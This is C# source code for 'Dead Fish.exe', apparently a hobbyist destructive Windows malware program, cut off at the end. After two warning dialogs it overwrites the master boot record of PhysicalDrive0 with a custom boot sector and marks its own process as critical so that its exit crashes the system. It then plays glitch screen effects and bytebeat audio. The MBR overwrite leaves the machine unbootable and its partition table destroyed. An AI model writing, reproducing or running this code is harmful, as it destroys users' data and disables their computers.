using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

internal static class Program
{
    #region Drawers
    private class Drawer1 : Drawer
    {
        private int redrawCounter;
        private int codcod;
        private static readonly int ballWidth = 0;
        private static int ballPosX = Screen.PrimaryScreen.Bounds.Width / 2;
        private static readonly int ballPosY = 0;
        private static int moveStepX = 10;
        private PointF org = new PointF(ballPosX, ballPosY);
        private int pat;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr hcdc = CreateCompatibleDC(hdc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(hcdc, hBitmap);


                BitBlt(hcdc, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                float angle = 0.0f;

                float rad = 0;
                Pen pen = new Pen(Brushes.Black, 3.0f);
                Rectangle area = new Rectangle(0, 0, 10, 10);
                Rectangle circle = new Rectangle(0, 0, 100, 100);

                PointF loc = PointF.Empty;
                PointF img = new PointF(0, 0);
                while (sds)
                {


                    Graphics gr = Graphics.FromHdc(hcdc);
                    redrawCounter += 1;

                    if (redrawCounter >= 255)
                    {
                        redrawCounter = 0;
                    }
                    SolidBrush solidBrush = new SolidBrush(Color.FromArgb(random.Next(255), random.Next(255), random.Next(255)));
                    loc = CirclePoint(rad, angle, org);
                    circle.X = (int)(loc.X - (circle.Width / 2) + area.X);
                    circle.Y = (int)(loc.Y - (circle.Height / 2) + area.Y);
                    gr.FillEllipse(solidBrush, circle.X, circle.Y, 25, 25);

                    if (redrawCounter >= 360)
                    {
                        redrawCounter = 0;

                    }

                    if (angle < 360)
                    {
                        angle += 10f;

                    }
                    else
                    {
                        angle = 0;

                        codcod += 75;
                        int cod = codcod;
                        rad = cod;
                        if (codcod >= screenW)
                        {
                            try
                            {
                                Random r = new Random();
                                int x = screenW;
                                int y = screenH;

                                ballPosX += moveStepX;
                                if (
                                    ballPosX < 0 ||
                                    ballPosX + ballWidth > screenW
                                    )
                                {
                                    moveStepX = -moveStepX;
                                }

                                pat++;
                                if (pat >= 10)
                                {
                                    for (int i = 0; i < screenW; i++)
                                    {
                                        BitBlt(hcdc, i, 0, 1, screenH, hcdc, random.Next(screenW), 0, (int)CopyPixelOperation.SourceCopy);
                                    }
                                    for (int i = 0; i < screenH; i++)
                                    {
                                        BitBlt(hcdc, 0, i, screenW, 1, hcdc, 0, random.Next(screenH), (int)CopyPixelOperation.SourceCopy);
                                    }
                                    pat = 0;
                                }

                                org = new PointF(ballPosX, ballPosY);
                                BitBlt(hdc, 0, 0, screenW, screenH, hcdc, 0, 0, 13369376);
                                moveStepX = random.Next(-1, 2) * 10;
                                codcod = 0;

                            }
                            catch { }
                        }
                    }

                }
                DeleteObject(hcdc);
                DeleteObject(hBitmap);
            }
            catch { }
        }
    }
    private class Drawer2 : Drawer
    {
        float da = 0;
        public override void Draw(IntPtr hdc)
        {
            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
               Screen.PrimaryScreen.Bounds.Height,
               PixelFormat.Format32bppRgb);

            var gfxScreenshot = Graphics.FromImage(bmp);

            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            Graphics g = Graphics.FromImage(bmp);
            g.SmoothingMode = SmoothingMode.HighSpeed;
            g.PixelOffsetMode = PixelOffsetMode.HighSpeed;
            da += (float)random.NextDouble();
            Bitmap bm = Solarise(bmp, (byte)random.Next(255), (byte)random.Next(255), (byte)random.Next(255));
            Bitmap bm1 = ColorShade(bmp, da, da, da);
            g.DrawImage(bm1, 0, 0);
            Bitmap bmp2 = new Bitmap(bm);
            Graphics hdc2 = Graphics.FromHdc(GetDC(IntPtr.Zero));
            IntPtr hdcDst = hdc2.GetHdc();
            IntPtr hdcTemp = CreateCompatibleDC(hdcDst);
            SelectObject(hdcTemp, bmp2.GetHbitmap());

            BitBlt(hdcDst, 0,0,screenW,screenH, hdcTemp, 0,10, 13369376);
            BitBlt(hdcDst, 0, 0, screenW, screenH, hdcTemp, 0, -screenH+10, 13369376);
            DeleteObject(hdcDst);
            DeleteObject(hdcTemp);
        }
    }
    private class Drawer3 : Drawer
    {

        public override void Draw(IntPtr hdc)
        {
            try
            {

                IntPtr hcdc = CreateCompatibleDC(hdc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(hcdc, hBitmap);
                BitBlt(hcdc, 0, 0, screenW, screenH, hdc, 0, 0, (int)CopyPixelOperation.SourceCopy);
                Graphics gr = Graphics.FromHdc(hcdc);
                var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
   Screen.PrimaryScreen.Bounds.Height,
   PixelFormat.Format32bppRgb);

                var gfxScreenshot = Graphics.FromImage(bmp);

                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                Graphics g = Graphics.FromImage(bmp);
                g.SmoothingMode = SmoothingMode.HighSpeed;
                g.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                Bitmap bm = SetHueRotate(bmp, 0.01F);
                SolidBrush solidBrush = new SolidBrush(Color.FromArgb(random.Next(255), random.Next(255), random.Next(255)));
                g.DrawString("Dead Fish.exe", new Font(FontFamily.GenericSerif, random.Next(1, 128)), solidBrush, random.Next(screenW), random.Next(screenH));
                gr.DrawImage(bmp, 0, 0);
                BLENDFUNCTION blf = new BLENDFUNCTION
                {
                    BlendOp = AC_SRC_OVER,
                    BlendFlags = 0,
                    SourceConstantAlpha = (byte)random.Next(127),
                    AlphaFormat = 0
                };
                AlphaBlend(hdc, -10, -10, screenW + 20, screenH + 20, hcdc, 0, 0, screenW, screenH, blf);
                DeleteObject(hcdc);
                DeleteObject(hBitmap);
                Thread.Sleep(random.Next(10));
            }
            catch { }

        }
    }
    private class Drawer4 : Drawer
    {
        private int redrawCounter;
        private int codcod;
        private static readonly int ballPosX = Screen.PrimaryScreen.Bounds.Width / 2;
        private static readonly int ballPosY = 0;
        private static int moveStepX = 10;
        private PointF org = new PointF(ballPosX, ballPosY);
        private int pat;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr hcdc = CreateCompatibleDC(hdc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(hcdc, hBitmap);
                float angle = 0.0f;

                float rad = 0;
                Pen pen = new Pen(Brushes.Black, 3.0f);
                Rectangle area = new Rectangle(0, 0, 10, 10);
                Rectangle circle = new Rectangle(0, 0, 100, 100);

                PointF loc = PointF.Empty;
                PointF img = new PointF(0, 0);
                int an2 = random.Next(22,180);
                while (sds)
                {
                    redrawCounter += 1;

                    if (redrawCounter >= 255)
                    {
                        redrawCounter = 0;
                    }
                    IntPtr hgdiobj = CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.FromArgb(random.Next(255), random.Next(255), random.Next(255))));
                    SelectObject(hcdc, hgdiobj);
                    PatBlt(hcdc, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);

                    Graphics gr = Graphics.FromHdc(hdc);

                    loc = CirclePoint(rad, angle, org);
                    circle.X = (int)(loc.X - (circle.Width / 2) + area.X);
                    circle.Y = (int)(loc.Y - (circle.Height / 2) + area.Y);
                    BitBlt(hdc, circle.X, circle.Y, 10, 10, hcdc, 0, 0, 13369376);


                    if (angle < 360)
                    {
                        angle += an2;

                    }
                    else
                    {
                        angle = 0;

                        codcod += 10;
                        int cod = codcod;
                        rad = cod;
                        if (codcod >= random.Next(1000))
                        {
                            try
                            {
                                Random r = new Random();
                                int x = screenW;
                                int y = screenH;

                                pat++;
                                if (pat >= 10)
                                {

                                }

                                org = new PointF(random.Next(screenW), random.Next(screenH));
                                moveStepX = random.Next(-1, 2) * 10;
                                codcod = 0;
                                BitBlt(hdc, 0, 0, screenW, screenH, hdc, random.Next(-10, 11), random.Next(-10, 11), (int)CopyPixelOperation.SourceCopy);
                            }
                            catch { }
                        }
                    }
                    DeleteObject(hgdiobj);
                }
                DeleteObject(hcdc);
                DeleteObject(hBitmap);

            }
            catch { }
        }
    }
    private class Drawer5 : Drawer
    {
        float da = 0;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr hcdc = CreateCompatibleDC(hdc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(hcdc, hBitmap);
                BitBlt(hcdc, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                Graphics g = Graphics.FromHdc(hcdc);
                var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
               Screen.PrimaryScreen.Bounds.Height,
               PixelFormat.Format32bppRgb);

                var gfxScreenshot = Graphics.FromImage(bmp);

                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                Graphics gr = Graphics.FromImage(bmp);
                gr.SmoothingMode = SmoothingMode.HighSpeed;
                gr.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                da += (float)random.NextDouble();
                Bitmap bm = Solarise(bmp, (byte)random.Next(255), (byte)random.Next(255), (byte)random.Next(255));
                gr.DrawImage(bm, 0, 0);
                

                int sizex = random.Next(screenW);
                int sizey = random.Next(screenH);
                for (int i = 0; i < 255; i++)
                {
                    Brush brush = new SolidBrush(Color.FromArgb(31, 255, 255, 255 - i));
                    gr.FillEllipse(brush, sizex + i / 2, sizey - i*2, 255 - i, 255 - i);
                }
                g.DrawImage(bmp, 0, 0);
                BLENDFUNCTION blf = new BLENDFUNCTION
                {
                    BlendOp = AC_SRC_OVER,
                    BlendFlags = 0,
                    SourceConstantAlpha = (byte)random.Next(256),
                    AlphaFormat = 0
                };
                AlphaBlend(hdc, random.Next(-2, 3), random.Next(-2, 3), screenW, screenH, hcdc, 0, 0, screenW, screenH, blf);
                DeleteObject(hcdc);
                DeleteObject(hBitmap);
            }
            catch { }
        }
    }
    private class Drawer6 : Drawer
    {
        float da = 0;
        public override void Draw(IntPtr hdc)
        {
            var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
               Screen.PrimaryScreen.Bounds.Height,
               PixelFormat.Format32bppRgb);

            var gfxScreenshot = Graphics.FromImage(bmp);

            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            Graphics g = Graphics.FromImage(bmp);
            g.SmoothingMode = SmoothingMode.HighSpeed;
            g.PixelOffsetMode = PixelOffsetMode.HighSpeed;
            da += (float)random.NextDouble();
            Bitmap bm1 = ColorShade(bmp, da, da, da);
            g.DrawImage(bm1, 0, 0);
            Bitmap bmp2 = new Bitmap(bm1);
            Graphics hdc2 = Graphics.FromHdc(GetDC(IntPtr.Zero));
            IntPtr hdcDst = hdc2.GetHdc();
            IntPtr hdcTemp = CreateCompatibleDC(hdcDst);
            SelectObject(hdcTemp, bmp2.GetHbitmap());

            BitBlt(hdcDst, 0, 0, screenW, screenH, hdcTemp, 0, 10, 13369376);
            BitBlt(hdcDst, 0, 0, screenW, screenH, hdcTemp, 0, -screenH + 10, 13369376);
            StretchBlt(hdcDst, random.Next(screenW), 0, random.Next(screenW), screenH, hdcTemp, 0, 0, screenW, screenH, CopyPixelOperation.SourceCopy);
            DeleteObject(hdcDst);
            DeleteObject(hdcTemp);
        }

    }
    private abstract class Drawer
    {
        public bool running;

        public Random random = new Random();

        public int screenW = Screen.PrimaryScreen.Bounds.Width;

        public int screenH = Screen.PrimaryScreen.Bounds.Height;

        public void Start()
        {
            if (!running)
            {
                running = true;
                new Thread(DrawLoop).Start();
            }
        }

        public void Stop()
        {
            running = false;
        }

        private void DrawLoop()
        {
            while (running)
            {
                IntPtr dC = GetDC(IntPtr.Zero);
                Draw(dC);
                ReleaseDC(IntPtr.Zero, dC);
            }
        }

        public void Redraw()
        {
            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
        }

        public abstract void Draw(IntPtr hdc);
    }
    #endregion
    #region Bytebeat
    static void byte1(int hz, int secs)
    {
        Random rnd = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());    
            writer.Write((UInt32)0);               
            writer.Write("WAVE".ToCharArray());   

            writer.Write("fmt ".ToCharArray());    
            writer.Write((UInt32)16);              
            writer.Write((UInt16)1);               

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8));   
            writer.Write((UInt16)(channels * bits_per_sample / 8));                 
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
            {

                data[t] = (byte)(
                    t * ((t >> 4 & t >> 8) ^ t >> 10)
                    );
            }

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                           
            writer.Write((UInt32)(writer.BaseStream.Length - 8));   

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    static void byte2(int hz, int secs)
    {
        Random rnd = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());    
            writer.Write((UInt32)0);               
            writer.Write("WAVE".ToCharArray());   

            writer.Write("fmt ".ToCharArray());    
            writer.Write((UInt32)16);              
            writer.Write((UInt16)1);               

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8));   
            writer.Write((UInt16)(channels * bits_per_sample / 8));                 
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * t >> ((t >> 10 | t % 16 * t >> 8) & 8 * t >> 12)
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                           
            writer.Write((UInt32)(writer.BaseStream.Length - 8));   

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    static void byte3(int hz, int secs)
    {
        Random rnd = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());    
            writer.Write((UInt32)0);               
            writer.Write("WAVE".ToCharArray());   

            writer.Write("fmt ".ToCharArray());    
            writer.Write((UInt32)16);              
            writer.Write((UInt16)1);               

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8));   
            writer.Write((UInt16)(channels * bits_per_sample / 8));                 
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    (t >> 2) * (t & (Convert.ToBoolean(t & 32768) ? 16 : 24) | t >> (t >> 8 & 28)) * t >> 2
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                           
            writer.Write((UInt32)(writer.BaseStream.Length - 8));   

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    static void byte4(int hz, int secs)
    {
        Random rnd = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());    
            writer.Write((UInt32)0);               
            writer.Write("WAVE".ToCharArray());   

            writer.Write("fmt ".ToCharArray());    
            writer.Write((UInt32)16);              
            writer.Write((UInt16)1);               

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8));   
            writer.Write((UInt16)(channels * bits_per_sample / 8));                 
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * (42 & t >> 8)
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                           
            writer.Write((UInt32)(writer.BaseStream.Length - 8));   

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    static void byte5(int hz, int secs)
    {
        Random rnd = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());    
            writer.Write((UInt32)0);               
            writer.Write("WAVE".ToCharArray());   

            writer.Write("fmt ".ToCharArray());    
            writer.Write((UInt32)16);              
            writer.Write((UInt16)1);               

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8));   
            writer.Write((UInt16)(channels * bits_per_sample / 8));                 
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * ((t >> 9 | t >> 11) & t * t)
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                           
            writer.Write((UInt32)(writer.BaseStream.Length - 8));   

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    static void byte6(int hz, int secs)
    {
        Random rnd = new Random();
        using (var stream = new MemoryStream())
        {
            var writer = new BinaryWriter(stream);

            writer.Write("RIFF".ToCharArray());    
            writer.Write((UInt32)0);               
            writer.Write("WAVE".ToCharArray());   

            writer.Write("fmt ".ToCharArray());    
            writer.Write((UInt32)16);              
            writer.Write((UInt16)1);               

            var channels = 1;
            var sample_rate = hz;
            var bits_per_sample = 8;

            writer.Write((UInt16)channels);
            writer.Write((UInt32)sample_rate);
            writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8));   
            writer.Write((UInt16)(channels * bits_per_sample / 8));                 
            writer.Write((UInt16)bits_per_sample);

            writer.Write("data".ToCharArray());

            var seconds = secs;

            var data = new byte[sample_rate * seconds];

            for (var t = 0; t < data.Length; t++)
                data[t] = (byte)(
                    t * ((Convert.ToBoolean(t & 4096) ? t % 65536 < 59392 ? 7 : t >> 6 : 16) + (1 & t >> 14)) >> (2 & -t >> (Convert.ToBoolean(t & 2048) ? 2 : 4))                
                    );

            writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

            foreach (var elt in data) writer.Write(elt);

            writer.Seek(4, SeekOrigin.Begin);                           
            writer.Write((UInt32)(writer.BaseStream.Length - 8));   

            stream.Seek(0, SeekOrigin.Begin);

            new SoundPlayer(stream).PlaySync();
        }
    }
    #endregion
    #region Main
    [STAThread]
    private static void Main()
    {
        Drawer drawer1 = new Drawer1();
        Drawer drawer2 = new Drawer2();
        Drawer drawer3 = new Drawer3();
        Drawer drawer4 = new Drawer4();
        Drawer drawer5 = new Drawer5();
        Drawer drawer6 = new Drawer6();
        if (MessageBox.Show("Run Short Malware?", "Dead Fish.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
        {
            if (MessageBox.Show("Are you sure?", "Final Warning!!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
            {
                var mbrData = new byte[] { 0xEB, 0x1C, 0xB8, 0x00, 0x10, 0x8C, 0xD0, 0xBC, 0x00, 0xF0, 0xB8, 0x07, 0x53, 0xBB, 0x01, 0x00, 0xB9, 0x03, 0x00, 0xCD, 0x15, 0xB4, 0x00, 0xCD, 0x16, 0x3C, 0x0D, 0x75, 0xF8, 0xC3, 0xE8, 0xE1, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA };
                var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
                WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
                int isCritical = 1;          
                int BreakOnTermination = 0x1D;      
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                Thread.Sleep(5000);
                drawer1.Start();
                byte1(8000, 30);
                drawer1.Stop(); sds = false;
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(50);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(50);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(50);
                drawer2.Start();
                byte2(8000, 30);
                drawer2.Stop();
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                drawer3.Start();
                byte3(8000, 30);
                drawer3.Stop();
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                drawer4.Start(); sds = true;
                byte4(8000, 30);
                drawer4.Stop(); sds = false;
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                drawer5.Start();
                byte5(8000, 30);
                drawer5.Stop();
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren); Thread.Sleep(10);
                drawer6.Start(); drawer3.Start();
                byte6(8000, 30);
                drawer6.Stop(); drawer3.Stop();
                Environment.Exit(1);
            }
        }

    }
    #endregion
    #region Statics
